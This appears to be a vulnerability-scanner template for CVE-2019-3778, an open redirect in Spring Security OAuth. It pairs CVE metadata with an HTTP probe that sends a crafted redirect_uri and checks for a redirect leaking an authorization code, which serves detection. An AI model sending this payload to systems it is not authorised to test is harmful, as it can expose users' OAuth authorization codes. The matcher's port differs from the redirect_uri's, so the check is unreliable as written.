id: CVE-2019-3778

info:
  name: Spring Security OAuth Open Redirection Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: Spring Security OAuth, versions 2.3 prior to 2.3.5, and 2.2 prior to 2.2.4, and 2.1 prior to 2.1.4, and 2.0 prior to 2.0.17, and older unsupported versions could be susceptible to an open redirector attack that can leak an authorization code.
  impact: |
    An attacker can redirect users to malicious websites, leading to phishing attacks or malware downloads.
  remediation: |
    Upgrade to a patched version of Spring Security OAuth to mitigate the vulnerability.
  reference:
    - http://packetstormsecurity.com/files/153299/Spring-Security-OAuth-2.3-Open-Redirection.html
    - https://www.oracle.com/security-alerts/cpujan2021.html
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/BBB-man/CVE-2019-3778-Spring-Security-OAuth-2.3-Open-Redirection
    - https://github.com/SexyBeast233/SecBooks
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
    cvss-score: 6.5
    cve-id: CVE-2019-3778
    cwe-id: CWE-601
    epss-score: 0.00439
    epss-percentile: 0.75567
    cpe: cpe:2.3:a:pivotal_software:spring_security_oauth:*:*:*:*:*:*:*:*
  metadata:
    vendor: pivotal_software
    product: spring_security_oauth

http:
  - method: GET
    path:
      - "/auth/oauth/authorize?response_type=code&client_id=R2dpxQ3vPrtfgF72&scope=user_info&state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&redirect_uri=http://localhost:9000/login/oauth2/code/"

    headers:
      Host: "localhost:8085"
      User-Agent: "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0"
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
      Accept-Language: "en-US,en;q=0.5"
      Accept-Encoding: "gzip, deflate"
      Referer: "http://localhost:8085/auth/login"
      Connection: "close"
      Cookie: "JSESSIONID=3394FD89204BE407CB585881755C0828; JSESSIONID=C0F1D5A2F1944DCB43F2BFFA416B7A63"
      Upgrade-Insecure-Requests: "1"
    matchers:
      - type: status
        status:
          - 302

      - type: word
        words:
          - "Location: http://localhost:8086/login/oauth2/code/?code="
        part: header
